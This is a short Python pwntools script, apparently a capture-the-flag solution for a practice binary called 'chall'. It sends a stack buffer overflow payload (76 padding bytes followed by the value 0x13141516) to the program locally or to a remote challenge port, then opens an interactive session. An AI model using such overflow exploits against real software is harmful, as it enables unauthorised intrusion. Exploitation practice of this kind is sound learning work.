#!/usr/bin/env python3
from pwn import *

exe_path = './chall'

HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
context.binary = exe 

gdbscript = '''
# Break tại main hoặc địa chỉ cụ thể
break *main
# break *win
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        p = process(exe.path)
        return p
    
    return process(exe.path)

p = start()

payload = 76 * b'A' + p32(0x13141516) + (100-80) * b'B'

p.sendafter(b"Enter your favorite number: ", payload)

p.interactive() 
